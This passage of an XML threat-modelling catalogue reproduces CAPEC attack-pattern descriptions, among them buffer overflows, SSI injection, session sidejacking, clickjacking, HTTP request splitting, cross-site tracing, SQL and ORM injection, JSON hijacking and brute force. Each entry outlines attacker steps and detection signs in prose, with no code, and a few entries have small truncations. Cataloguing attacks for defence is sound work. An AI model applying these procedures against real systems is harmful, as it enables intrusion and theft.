  <description>This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the attacker finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables.The attacker tries to find an environment variable which can be overwritten for instance by gathering information about the target host (error pages, software's version number, etc.).The attacker manipulates the environment variable to contain excessive-length content to cause a buffer overflow.The attacker potentially leverages the buffer overflow to inject maliciously crafted code in an attempt to execute privileged command on the target environment.While interacting with a system an attacker would typically investigate for environment variables that can be overwritten. The more a user knows about a system the more likely she will find a vulnerable environment variable.On a web environment, the attacker can read the client side code and search for environment variables that can be overwritten.There are tools such as Sharefuzz (http://sharefuzz.sourceforge.net/) which is an environment variable fuzzer for Unix that support loading a shared library. Attackers can use such tools to uncover a buffer overflow in an environment variable.If the application does bound checking, it should fail when the data source is larger than the size of the destination buffer. If the application's code is well written, that failure should triger an alert.The most common is remote code execution.</description>
</threat>
<threat label="CAPEC-100" name="Overflow Buffers" type="Standard" reference="CAPEC">
  <description>Buffer Overflow attacks target improper or missing bounds checking on buffer operations, typically triggered by input injected by an attacker. As a consequence, an attacker is able to write past the boundaries of allocated buffer regions in memory, causing a program crash or potentially redirection of execution as per the attacker's choice.The attacker identifies a buffer to target. Buffer regions are either allotted on the stack or the heap, and the exact nature of attack would vary depending on the location of the bufferNext, the attacker identifies an injection vector to deliver the excessive content to the targeted buffer.The attacker crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the attacker will craft a set of content that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the attacker's choosing which points to code injected by the attacker.The attacker injects the content into the targeted software.Upon successful exploitation, the system either crashes or control of the program is returned to a location of the attacker's choice. This can result in execution of arbitrary code or escalated privileges, depending upon the exploited target.The attacker sends in overtly long input in variables under his control. If the target system or application handles it gracefully, the attack becomes difficult. However, an error condition or a system crash point to a high likelihood of successful exploitation.In cases where the attack is directed at a particular system or application, such as an operating system or a web server, the attacker can refer to system architecture and design documentation to figure out the exact point of injection and exploitation.An attack designed to leverage a buffer overflow and redirect execution as per the attacker's bidding is fairly difficult to detect. An attack aimed solely at bringing the system down is usually preceded by a barrage of long inputs that make no sense. In either case, it is likely that the attacker would have resorted to a few hit-or-miss attempts that will be recorded in the system event logs, if they exist.A buffer overflow attack itself is pretty difficult to obfuscate. There, however, exist fairly advanced techniques to ofuscate the payload, in order to bypass an intrusion detection system or filtering, either in the application or by means of an application firewall of some sorts.Denial of service, escalated privileges, execution of arbitrary code, including system commands and low-level assembly code.</description>
</threat>
<threat label="CAPEC-101" name="Server Side Include (SSI) Injection" type="Standard" reference="CAPEC">
  <description>An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands.The attacker determines whether server side includes are enabled on the target web server.Look for popular page file names. The attacker will look for .shtml, .shtm, .asp, .aspx, and other well known strings in URLs to help determine whether SSI functionality is enabled.Fetch .htaccess file. In Apache web server installations, the .htaccess file may enable server side includes in specific locations. In those cases, the .htaccess file lives inside the directory where SSI is enabled, and is theoretically fetchable from the web server. Although most web servers deny fetching the .htaccess file, a misconfigured server will allow it. Thus, an attacker will frequently try it.If .htaccess files are used, their contents should be checked for &quot;Options Includes&quot; or &quot;Options IncludesNOEXEC&quot;.If apache is used, the contents of the httpd.conf file and similar configuration files should be checked for &quot;Options Includes&quot; or &quot;Options IncludesNOEXEC&quot;.IIS configurations contain server-side include compatibility.Web pages that include mundane, but dynamic information (like the current date, a file's size, or some other data that SSI can produce) might be producing that content through SSI.Look for user controllable input, including HTTP headers, that can carry server side include directives to the web serverUse a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.URL parameters are used.No parameters appear on the URL. Even though none appear, the web application may still use them if they are provided.The attacker may then need to view a particular page in order to have the server execute the include directive and run a command or open a file on behalf of the attackerThe attacker can probe for enabled SSI by injecting content that can be interpreted as SSI directives and viewing the page outputThe SSI directives cause the inclusion of certain file's contents or the execution of a shell command, as directed by the attacker</description>
</threat>
<threat label="CAPEC-102" name="Session Sidejacking" type="Standard" reference="CAPEC">
  <description>ss network.The attacker sniffs on the wireless network to detect unencrypted traffic that contains session tokens.The attacker uses a network sniffer tool like ferret or hampster to monitor the wireless traffic at a WiFi hotspot while examining it for evidence of transmittal of session tokens in unencrypted or recognizably encrypted form. An attacker applies his knowledge of the manner by which session tokens are generated and transmitted by various target systems to identify the session tokens.The attacker and the victim are both on the same WiFi network.Traffic between the victim and targeted application is unencrypted.The attacker uses sniffing tools to capture a session token from traffic.The attacker attempts to insert a captured session token into communication with the targeted application to confirm viability for exploitation.The attacker leverages the captured session token to interact with the targeted application in a malicious fashion, impersonating the victim.Use available tools to snoop on communications between the victim and the target system and try to capture the transmitted session tokenUse the captured session token to impersonate the victim on the target system to perform actions and view information on their behalf.</description>
</threat>
<threat label="CAPEC-103" name="Clickjacking" type="Standard" reference="CAPEC">
  <description>In a clickjacking attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system. While being logged in to some target system, the victim visits the attacker's malicious site which displays a UI that the victim wishes to interact with. In reality, the clickjacked page has a transparent layer above the visible UI with action controls that the attacker wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the attacker may have just tricked the victim into executing some potentially privileged (and most certainly undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks he's clicking on versus what he or she is actually clicking on.The attacker utilizes web page layering techniques to try to craft a malicious clickjacking pageThe attacker leveraged iFrame overlay capabilities to craft a malicious clickjacking pageThe attacker leveraged Flash file overlay capabilities to craft a malicious clickjacking pageThe attacker leveraged Silverlight overlay capabilities to craft a malicious clickjacking pageThe attacker leveraged cross-frame scripting to craft a malicious clickjacking pageOverlay capabilities are enabled in the browserAttacker utilizes some form of temptation, misdirection or coercion to lure the victim to loading and interacting with the clickjacking pagen a way that increases the chances that the victim will click in the right areas.Lure the victim to the malicious site by sending the victim an e-mail with a URL to the site.Lure the victim to the malicious site by manipulating URLs on a site trusted by the victim.Lure the victim to the malicious site through a cross-site scripting attack.The attacker tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.Hide action controls over very commonly used functionality.Hide action controls over very psychologically tempting content.</description>
</threat>
<threat label="CAPEC-104" name="Cross Zone Scripting" type="Standard" reference="CAPEC">
  <description>An attacker is able to cause a victim to load content into their web-browser that bypasses security zone controls and gain access to increased privileges to execute scripting code or other web objects such as unsigned ActiveX controls or applets. This is a privilege elevation attack targeted at zone-based web-browser security. In a zone-based model, pages belong to one of a set of zones corresponding to the level of privilege assigned to that page. Pages in an untrusted zone would have a lesser level of access to the system and/or be restricted in the types of executable content it was allowed to invoke. In a cross-zone scripting attack, a page that should be assigned to a less privileged zone is granted the privileges of a more trusted zone. This can be accomplished by exploiting bugs in the browser, exploiting incorrect configuration in the zone controls, through a cross-site scripting attack that causes the attacker's content to be treated as coming from a more trusted page, or by leveraging some piece of system functionality that is accessible from both the trusted and less trusted zone. This attack differs from &quot;Restful Privilege Escalation&quot; in that the latter correlates to the inadequate securing of RESTful access methods (such as HTTP DELETE) on the server, while cross-zone scripting attacks the concept of security zones as implemented by a browser.Find systems that contain functionality that is accessed from both the internet zone and the local zone. There needs to be a way to supply input to that functionality from the internet zone and that original input needs to be used later on a page from a local zone.Leverage knowledge of common local zone functionality on targeted platforms to guide attempted injection of code through relevant internet zone mechanisms. In some cases this may be due to standard system configurations enabling shared functionality between internet and local zones. The attacker can search for indicators that these standard configurations are in place.The attacker first needs to find some system functionality or possibly another weakness in the system (e.g. susceptibility to cross site scripting) that would provide the attacker with a mechanism to deliver the payload (i.e.the code to be executed) to the user. The location from which this code is executed in the user's browser needs to be within the local machine zone.Finding weaknesses in functionality used by both privileged and unprivileged users.Develop the payload to be executed in the higher privilged zone in the user's browser. Inject the payload and attempt to lure the victim (if possible) into executing the functionality which unleashes the payload.The attacker makes it as likely as possible that the vulnerable functionality into which he has injected the payload has a high likelihood of being used by the victim.Leverage cross-site scripting vulnerability to inject payload.</description>
</threat>
<threat label="CAPEC-105" name="HTTP Request Splitting" type="Standard" reference="CAPEC">
  <description>HTTP Request Splitting (also known as HTTP Request Smuggling) is an attack pattern where an attacker attempts to insert additional HTTP requests in the body of the original (enveloping) HTTP request in such a way that the browser interprets it as one request but the web server interprets it as two.There are several ways to perform HTTP request splitting attacks. One way is to include double Content-Length headers in the request to exploit the fact that the devices parsing the request may each use a different header. Another way is to submit an HTTP request with a &quot;Transfer Encoding: chunked&quot; in the request header set with setRequestHeader to allow a payload in the HTTP Request that can be considered as another HTTP Request by a subsequent parsing entity. A third way is to use the &quot;Double CR in an HTTP header&quot; technique. There are also a few less general techniques targetting specific parsing vulnerabilities in certain web servers.Determine the technologies used in the target environment such as types of browsers, web servers, application firewalls, proxies, etc.Investigation of the target environment to determine the types of technologies used to parse the incoming HTTP requests. Attempt to understand how HTTP Request headers are parsedPost a malicious HTTP request that will be interpreted as multiple HTTP requests when parsed on the server Post a malicious HTTP Request utilizing double CR/LF characters in HTTP header to cause request splitting Post a malicious HTTP Request utilizing &quot;Transfer Encoding: chunked&quot; in the request header to cause request splitting Post a malicious HTTP Request utilizing double Content-Length headers to cause request splittingIssue HTTP Requests against a target server and examine responses.</description>
</threat>
<threat label="CAPEC-106" name="Cross Site Scripting through Log Files" type="Standard" reference="CAPEC">
  <description>An attacker may leverage a system weakness where logs are susceptible to log injection to insert scripts into the system's logs. If these logs are later viewed by an administrator through a thin administrative interface and the log data is not properly HTML encoded before being written to the page, the attacker's scripts stored in the log will be executed in the administrative interface with potentially serious consequences. This attack pattern is really a combination of two other attack patterns: log injection and stored cross site scripting.The attacker probes all user-controllable data inputs to the system to probe for log injection vulnerabilities. This may be difficult (unless the attacker has a white box view of the system) because there may not be a feedback event to indicate to the attacker that certain information is being logged.The attacker probes all user-controllable data inputs to the system to probe for any cross-site scripting vulnerabilities. Cross-site scripting vulnerabilities identified anywhere in the application indicate an increased potential that such vulnerabilities may exist in the log management portions of the application.Create a simple script and inject it into one of the potentially vulnerable fields. This script should take some action which will give an attacker an indication that the attack vector exists.The idea is to receive some sort of a feedback event that confirms that an attack is succeeding. That is done with a simple script prior to crafting possibly a more complex script to launch an actual attack.Create a malicious script to run in the administrator's web based interface and inject it in the system's logs through one of the user controlled fields that are being logged.Inject the vulnerable fields by tampering with their values to contain the malicious scripts. Possibly trigger another event that makes it more likely that injected logs are viewed in the vulnerable UI as soon as possible.Locate system screens for operations that are likely to be logged and use these as starting points for injection</description>
</threat>
<threat label="CAPEC-107" name="Cross Site Tracing" type="Standard" reference="CAPEC">
  <description>Cross Site Tracing (XST) enables an attacker to steal the victim's session cookie and possibly other authentication credentials transmitted in the header of the HTTP request when the victim's browser communicates to destination system's web server. The attacker first gets a malicious script to run in the victim's browser that induces the browser to initiate an HTTP TRACE request to the web server. If the destination web server allows HTTP TRACE requests, it will proceed to return a response to the victim's web browser that contains the original HTTP request in its body. The function of HTTP TRACE, as defined by the HTTP specification, is to echo the request that the web server receives from the client back to the client. Since the HTTP header of the original request had the victim's session cookie in it, that session cookie can now be picked off the HTTP TRACE response and sent to the attacker's malicious site. XST becomes relevant when direct access to the session cookie via the &quot;document.cookie&quot; object is disabled with the use of httpOnly attribute which ensures that the cookie can be transmitted in HTTP requests but cannot be accessed in other ways. Using SSL does not protect against XST.If the system with which the victim is interacting is susceptible to XSS, an attacker can exploit that weakness directly to get his or her malicious script to issue an HTTP TRACE request to the destination system's web server. In the absense of an XSS weakness on the site with which the victim is interacting, an attacker can get the script to come from the site that he controls and get it to execute in the victim's browser (if he can trick the victim's into visiting his malicious website or clicking on the link that he supplies). However, in that case, due to the single origin policy protection mechanism in the browser, the attacker's malicious script cannot directly issue an HTTP TRACE request to the destination system's web server because the malicious script did not originate at that domain. An attacker will then need to find a way to exploit another weakness that would enable him or her to get around the single origin policy protection.Determine if HTTP Trace is enabled at the web server with which the victim has a an active sessionAn attacker may issue an HTTP Trace request to the target web server and observe if the response arrives with the original request in the body of the response.HTTP Trace is enabled on the web serverThe attacker attempts to force the victim to issue an HTTP Trace request to the targeted application.The attacker probes for cross-site scripting vulnerabilities to force the victim into issuing an HTTP Trace request.Create a malicious script that will induce the victim's browser to issue an HTTP TRACE request to the destination system's web server. The script will further intercept the response from the web server, pick up sensitive information out of it, and forward to the site controlled by the attacker.The attacker's malicious script circumvents the httpOnly cookie attribute that prevents from hijacking the victim's session cookie directly using document.cookie and instead leverages the HTTP TRACE to catch this information from the header of the HTTP request once it is echoed back from the web server in the body of the HTTP TRACE response.The attacker leverages a vulnerability to force the victim to execute the malicious HTTP Trace launching scriptSend HTTP TRACE requests to the destination web server to see if it responds</description>
</threat>
<threat label="CAPEC-108" name="Command Line Execution through SQL Injection" type="Standard" reference="CAPEC">
  <description>An attacker uses standard SQL injection methods to inject data into the command line for execution. This could be done directly through misuse of directives such as MSSQL_xp_cmdshell or indirectly through injection of data into the database that would be interpreted as shell commands. Sometime later, an unscrupulous backend application (or could be part of the functionality of the same application) fetches the injected data stored in the database and uses this data as command line arguments without performing proper validation. The malicious data escapes that data plane by spawning new commands to be executed on the host.The attacker injects SQL syntax into user-controllable data inputs to search unfiltered execution of the SQL syntax in a query.Attacker receives normal response from server.Attacker receives an error message from server indicating that there was a problem with the SQL query.Server sends a specific error message that indicates programmatic parsing of the input data (e.g. NumberFormatException)The attacker leverages a SQL Injection attack to inject shell code to be executed by leveraging the xp_cmdshell directive.Leverage SQL injection to inject data in the database that could later be used to achieve command injection if ever used as a command line argumentThe attacker causes execution of command line functionality which leverages previously injected database content as arguments.</description>
</threat>
<threat label="CAPEC-109" name="Object Relational Mapping Injection" type="Standard" reference="CAPEC">
  <description>An attacker leverages a weakness present in the database access layer code generated with an Object Relational Mapping (ORM) tool or a weakness in the way that a developer used a persistence framework to inject his or her own SQL commands to be executed against the underlying database. The attack here is similar to plain SQL injection, except that the application does not use JDBC to directly talk to the database, but instead it uses a data access layer generated by an ORM tool or framework (e.g. Hibernate). While most of the time code generated by an ORM tool contains safe access methods that are immune to SQL injection, sometimes either due to some weakness in the generated code or due to the fact that the developer failed to use the generated access methods properly, SQL injection is still possible.An attacker tries to determine what persistence framework is used by the application in order to leverage a weakness in the generated data access layer code or a weakness in a way that the data access layer may have been used by the developer.An attacker provides input to the application in an attempt to induce an error screen that reveals a strack trace that gives an indication of the automated data access layer used. Or an attacker may simply make some educated guesses and assume, for instance, that Hibernate is used and try to craft an attack from there.The attacker injects ORM syntax into user-controllable data inputs of the application to determine if it is possible modify data query structure and content.Attacker receives normal response from server.Attacker receives an error message from server indicating that there was a problem with the data query.Server sends a specific error message that indicates programmatic parsing of the input data (e.g. NumberFormatException)An attacker proceeds to exploit a weakness in the generated data access methods that does not properly separate control plane from the data plan, or potentially a particular way in which developer might have misused the generated code, to modify the structure of the executed SQL queries and/or inject entirely new SQL queries.An attacker uses normal SQL injection techniques and adjusts them to reflect the type of data access layer generation framework used by the application.Provide various input to the system in an attempt to induce an error that would reveal stack trace information about the ORM layer (if any) used</description>
</threat>
<threat label="CAPEC-11" name="Cause Web Server Misclassification" type="Standard" reference="CAPEC">
  <description>An attack of this type exploits a Web server's decision to take action based on filename or file extension. Because different file types are handled by different server processes, misclassification may force the Web server to take unexpected action, or expected actions in an unexpected sequence. This may cause the server to exhaust resources, supply debug or system data to the attacker, or bind an attacker to a remote process.This type of vulnerability has been found in many widely used servers including IIS, Lotus Domino, and Orion. The attacker's job in this case is straightforward, standard communication protocols and methods are used and are generally appended with malicious information at the tail end of an otherwise legitimate request. The attack payload varies, but it could be special characters like a period or simply appending a tag that has a special meaning for operations on the server side like .jsp for a java application server. The essence of this attack is that the attacker deceives the server into executing functionality based on the name of the request, i.e. login.jsp, not the contents.Manually or using an automated tool, an attacker searches for all input locations where a user has control over the filenames or MIME types of files submitted to the web server.Attacker manually crawls application to identify file inputsAttacker uses an automated tool to crawl application identify file inputsAttacker manually assesses strength of access control protecting native application files from user controlAttacker explores potential for submitting files directly to the web server via independently constructed HTTP RequestsApplication submits files under user control to the web serverApplication does not submit files under user control to the web serverApplication strictly protects all native application files from user controlAn attacker makes changes to file extensions and MIME types typically processed by web servers and looks for abnormal behavior.Attacker submits files with switched extensions (e.g. .php on a .jsp file) to web server.Attacker adds extra characters (e.g. adding an extra . after the file extension) to filenames of files submitted to web server.The web server uses the wrong handler to execute the file, as expected by the attacker.No result from the web server.The web server ignore the manipulation and process the request has it should have been.Understanding how certain file types are processed by web servers, an attacker crafts varying file payloads and modifies their file extension or MIME type to be that of the targeted type to see if the web server is vulnerable to misclassification of that type.Craft a malicious file payload, modify file extension to the targeted file type and submit it to the web server.Craft a malicious file payload, modify its associated MIME type to the targeted file type and submit it to the web server.The web server uses the wrong handler to execute the file, as expected by the attacker.No result from the web server.The web server ignore the manipulation and process the request has it should have been.The attacker, by manipulating a file extension or MIME type is able to make the web server return raw information (not executed).Manipulate the file names that are explicitly sent to the server.Manipulate the MIME sent in order to confuse the web server.Enables attacker to force web server to disclose configuration, source, and data</description>
</threat>
<threat label="CAPEC-110" name="SQL Injection through SOAP Parameter Tampering" type="Standard" reference="CAPEC">
  <description>An attacker modifies the parameters of the SOAP message that is sent from the service consumer to the service provider to initiate a SQL injection attack. On the service provider side, the SOAP message is parsed and parameters are not properly validated before being used to access a database in a way that does not use parameter binding, thus enabling the attacker to control the structure of the executed SQL query. This pattern describes a SQL injection attack with the delivery mechanism being a SOAP message.The attacker tampers with the SOAP message parameters and looks for indications that the tampering caused a change in behavior of the targeted application.The attacker tampers with the SOAP message parameters by injecting some special characters such as single quotes, double quotes, semi columns, etc. The attacker observes system behavior.SOAP messages are used as a communication mechanism in the systemThe attacker injects SQL syntax into vulnerable SOAP parameters identified during the Explore phase to search for unfiltered execution of the SQL syntax in a query.Attacker receives normal response from server.Attacker receives an error message from server indicating that there was a problem with the SQL query.Server sends a specific error message that indicates programmatic parsing of the input data (e.g. NumberFormatException)The attacker injects SQL via SOAP parameters identified as vulnerable during Explore phase to launch a first or second order SQL injection attack.An attacker performs a SQL injection attack via the usual methods leveraging SOAP parameters as the injection vector. An attacker has to be careful not to break the XML parser at the service provider which may prevent the payload getting through to the SQL query. The attacker may also look at the WSDL for the web service (if available) to better understand what is expected by the service provider.Inject SQL characters in SOAP parameters and observe system behaviorReview WSDL to understand what is expected by the service provider</description>
</threat>
<threat label="CAPEC-111" name="JSON Hijacking (aka JavaScript Hijacking)" type="Detailed" reference="CAPEC">
  <description>An attacker targets a system that uses JavaScript Object Notation (JSON) as a transport mechanism between the client and the server (common in Web 2.0 systems using AJAX) to steal possibly confidential information transmitted from the server back to the client inside the JSON object by taking advantage of the loophole in the browser's Single Origin Policy that does not prohibit JavaScript from one website to be included and executed in the context of another website.An attacker gets the victim to visit his or her malicious page that contains a script tag whose source points to the vulnerable system with a URL that requests a response from the server containing a JSON object with possibly confidential information. The malicious page also contains malicious code to capture the JSON object returned by the server before any other processing on it can take place, typically by overriding the JavaScript function used to create new objects. This hook allows the malicious code to get access to the creation of each object and transmit the possibly sensitive contents of the captured JSON object to the attacker's server.There is nothing in the browser's security model to prevent the attacker's malicious JavaScript code (originating from attacker's domain) to set up an environment (as described above) to intercept a JSON object response (coming from the vulnerable target system's domain), read its contents and transmit to the attacker's controlled site. The single origin policy protects the domain object model (DOM), but not the JSON.An attacker first explores the target system to understand what URLs need to be provided to it in order to retrieve JSON objects that contain information of interest to the attacker.An attacker creates an account with the target system and observes requests and the corresponding JSON responses from the server. Understanding how to properly elicit responses from the server is crucial to the attacker's ability to craft the exploit.Targeted application leverages JSON in its architecture.The attacker crafts a malicious website to which he plans to lure the victim who is using the vulnerable target system. The malicious website does two things:1. Contains a hook that intercepts incoming JSON objects, reads their contents and forwards the contents to the server controlled by the attacker (via a new XMLHttpRequest).2. Uses the script tag with a URL in the source that requests a JSON object from the vulnerable target system. Once the JSON object is transmitted to the victim's browser, the malicious code (as described in step 1) intercepts that JSON object, steals its contents, and forwards to the attacker.This attack step leverages the fact that the single origin policy in the browser does not protect JavaScript originating from one domain from setting up an environment to intercept and access JSON objects arriving from a completely different domain.An attacker lures the victim to the malicious website or leverages other means to get his malicious code executing in the victim's browser. Once that happens, the malicious code makes a request to the victim target system to retrieve a JSON object with sensitive information. The request includes the victim's session cookie if the victim is logged in.An attacker employs a myriad of standard techniques to get the victim to visit his or her malicious site or by some other means get the attacker's malicious code executing in the victim's browser.Examine the typical asynchronous requests and responses between an AJAX client and the server to see how JSON objects are requested and what is returned.</description>
</threat>
<threat label="CAPEC-112" name="Brute Force" type="Standard" reference="CAPEC">
  <description>In this attack, some asset (information, functionality, identity, etc.) is protected by a finite secret value. The attacker attempts to gain access to this asset by using trial-and-error to exhaustively explore all the possible secret values in the hope of finding the secret (or a value that is functionally equivalent) that will unlock the asset. Examples of secrets can include, but are not limited to, passwords, encryption keys, database lookup keys, and initial values to one-way functions.The key factor in this attack is the attacker's ability to explore the possible secret space rapidly. This, in turn, is a function of the size of the secret space and the computational power the attacker is able to bring to bear on the problem. If the attacker has modest resources and the secret space is large, the challenge facing the attacker is intractable. While the defender cannot control the resources available to an attacker, they can control the size of the secret space. Creating a large secret space involves selecting one's secret from as large a field of equally likely alternative secrets as possible and ensuring that an attacker is unable to reduce the size of this field using available clues or cryptoanalysis. Doing this is more difficult than it sounds since elimination of patterns (which, in turn, would provide an attacker clues that would help them reduce the space of potential secrets) is difficult to do using deterministic machines, such as computers. Assuming a finite secret space, a brute force attack will eventually succeed. The defender must rely on making sure that the time and resources necessary to do so will exceed the value of the information. For example, a secret space that will likely take hundreds of years to explore is likely safe from raw-brute force attacks.Determine how a potential guess of the secret may be tested. This may be accomplished by comparing some manipulation of the secret to a known value, use of the secret to manipulate some known set of data and determining if the result displays specific characteristics (for example, turning cryptotext into plaintext), or by submitting the secret to some external authority and having the external authority respond as to whether the value was the correct secret. Ideally, the attacker will want to determine the correctness of their guess independently since involvement of an external authority is usually slower and can provide an indication to the defender that a brute-force attack is being attempted.Determine if there is a way to parallelize the attack. Most brute force attacks can take advantage of parallel techniques by dividing the search space among available resources, thus dividing the average time to success by the number of resources available. If there is a single choke point, such as a need to check answers with an external authority, the attacker's position is significantly degraded.Find ways to reduce the secret space. The smaller the attacker can make the space they need to search for the secret value, the greater their chances for success. There are a great many ways in which the search space may be reduced.If possible, determine how the secret was selected. If the secret was determined algorithmically (such as by a random number generator) the algorithm may have patterns or dependencies that reduce the size of the secret space. If the secret was created by a human, behavioral factors may, if not completely reduce the space, make some types of secrets more likely than others. (For example, humans may use the same secrets in multiple places or use secrets that look or sound familiar for ease of recall.)If the secret was chosen algorithmically, cryptoanalysis can be applied to the algorithm to discover patterns in this algorithm. (This is true even if the secret is not used in cryptography.) Periodicity, the need for seed values, or weaknesses in the generator all can result in a significantly smaller secret space.If the secret was chosen by a person, social engineering and simple espionage can indicate patterns in their secret selection. If old secrets can be learned (and a target may feel they have little need to protect a secret that has been replaced) hints as to their selection preferences can be gleaned. These can include character substitutions a target employs, patterns in sources (dates, famous phrases, music lyrics, family members, etc.). Once these patterns have been determined, the initial efforts of a brute-force attack can focus on these areas.Some algorithmic techniques for secret selection may leave indicators that can be tested for relatively easily and which could then be used to eliminate large areas of the search space for consideration. For example, it may be possible to determine that a secret does or does not start with a given character after a relatively small number of tests. Alternatively, it might be possible to discover the length of the secret relatively easily. These discoveries would significantly reduce the search space, thus increasing speed with which the attacker discovers the secret.It is sometimes possible to expand victory conditions. For example, the attacker might not need to know the exact secret but simply needs a value that produces the same result using a one-way function. While doing this does not reduce the size of the search space, the presence of multiple victory conditions does reduce the likely amount of time that the attacker will need to explore the space before finding a workable value.If possible, gather the necessary information so a successful search can be determined without consultation of an external authority. This can be accomplished by capturing cryptotext (if the goal is decoding the text) or the encrypted password dictionary (if the goal is learning passwords).Repeated submissions of incorrect secret values may indicate a brute force attack. For example, repeated bad passwords when accessing user accounts or repeated queries to databases using non-existent keys.Attempts to download files protected by secrets (usually using encryption) may be a precursor to an offline attack to break the file's encryption and read its contents. This is especially significant if the file itself contains other secret values, such as password files.If the attacker is able to perform the checking offline then there will likely be no indication that an attack is ongoing.The attack is impossible to detect if the attacker can test for successful discovery of the secret value independently, without needing to consult an external authority.If an external authority must be consulted, the attacker can attempt to space out their guesses to avoid a large number of failed guesses in a short period of time, but doing so slows the attack to the point of making it unworkable against all but the most trivial secret spaces. As such, if an external authority must be consulted the attacked is unlikely to be able to keep the attack secret.</description>
</threat>
<threat label="CAPEC-113" name="API Abuse/Misuse" type="Standard" reference="CAPEC">
  <description>An attacker manipulates the processing of Application Programming Interface (API) resulting in the API's function having an adverse impact upon the security of the system or application implementing the API. This can allow the attacker to execute functionality not intended by the API implementation, possibly compromising the system or application which integrates the API. API Abuse can take on a number of forms. For example, the API may trust that the calling function properly validates its data and thus it may be manipulated by supplying metacharacters or alternate encodings as input, resulting in any number of injection flaws, including SQL injection, cross-site scripting, or command execution. Another example could be API methods that should be disabled in a production application but were not, thus exposing dangerous functionality within a production environment.</description>
</threat>
<threat label="CAPEC-114" name="Authentication Abuse" type="Standard" reference="CAPEC">
  <description>An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker. This attack may exploit assumptions made by the target's authentication procedures, such as assumptions regarding trust relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the &quot;Exploitation of Session Variables, Resource IDs and other Trusted Credentials&quot; attack patterns.</description>
</threat>
<threat label="CAPEC-115" name="Authentication Bypass" type="Standard" reference="CAPEC">
  <description>An attacker gains access to application, service, or device with the privileges of an authorized or privileged user by evading or circumventing an authentication mechanism. The attacker is therefore able to access protected data without authentication ever having taken place. This refers to an attacker gaining access equivalent to an authenticated user without ever going through an authentication procedure. This is usually the result of the attacker using an unexpected access procedure that does not go through the proper checkpoints where authentication should occur. For example, a web site might assume that all users will click through a given link in order to get to secure material and simply authenticate everyone that clicks the link. However, an attacker might be able to reach secured web content by explicitly entering the path to the content rather than clicking through the authentication link, thereby avoiding the check entirely. This attack pattern differs from other uthentication attacks in that attacks of this pattern avoid authentication entirely, rather than faking authentication by exploiting flaws or by stealing credentials from legitimate users.</description>
</threat>
<threat label="CAPEC-116" name="Data Excavation Attacks" type="Standard" reference="CAPEC">
  <description>An attacker probes the target in a manner that is designed to solicit information relevant to system security. This is achieved by sending data that is syntactically invalid or non-standard relative to a given service, protocol, or expected-input, or by exploring the target via ordinary interactions for the purpose of gathering intelligence about the target. As a result the attacker is able to obtain information from the target that aids the attacker in making inferences about its security, configuration, or potential vulnerabilities. Some exchanges witht the target may trigger unhandled exceptions or verbose error messages. When this happens error messages may reveal information like stack traces, configuration information, path information, or database messages. This type of attack also includes manipulation of query strings in a URI, such as by attemtping to produce invalid SQL queries or by trying alternative path values, in the hope that the server will return useful information. This attack differs from Data Interception and other data collection attacks in that the attacker actively queries the target rather than simply watching for the target to reveal information.</description>
</threat>
<threat label="CAPEC-117" name="Data Interception Attacks" type="Standard" reference="CAPEC">
  <description>An attacker monitors data streams to or from a target in order to gather information. This attack may be undertaken to gather information to support a later attack or the data collected may be the end goal of the attack. This attack usually involves sniffing network traffic, but may include observing other types of data streams, such as radio. In most varieties of this attack, the attacker is passive and simply observes regular communication, however in some variants the attacker may attempt to initiate the establishment of a data stream or influence the nature of the data transmitted. However, in all variants of this attack, and distinguishing this attack from other data collection methods, the attacker is not the intended recipient of the data stream. Unlike some other data leakage attacks, the attacker is observing explicit data channels (e.g. network traffic) and reading the content. This differs from attacks that collect more qualitative information, such as communication volume, or other information not explicitly communicated via a data stream.</description>
</threat>
<threat label="CAPEC-12" name="Choosing a Message/Channel Identifier on a Public/Multicast Channel" type="Standard" reference="CAPEC">
  <description>Attackers aware that more data is being fed into a multicast or public information distribution means can 'select' information bound only for another client, even if the distribution means itself forces users to authenticate in order to connect initally.Doing so allows the attacker to gain access to possibly privileged information, possibly perpetrate other attacks through the distribution means by impersonation.If the channel/message being manipulated is an input rather than output mechanism for the system, (such as a command bus), this style of attack could change its identifier from a less privileged to more so privileged channel or command.Determine the nature of messages being transported as well as the identifiers to be used as part of the attackIf required, authenticate to the distribution channelIf any particular client's information is available through the transport means simply by selecting a particular identifier, an attacker can simply provide that particular identifier.Attackers with client access connecting to output channels could change their channel identifier and see someone else's (perhaps more privileged) data.Assisted protocol analysis: because the protocol under attack is a public channel, or one in which the attacker likely has authorized access to, they need simply to decode the aspect of channel or message interpretation that codes for message identifiers.Probing is as simple as changing this value and watching its effect.</description>
</threat>
<threat label="CAPEC-120" name="Double Encoding" type="Standard" reference="CAPEC">
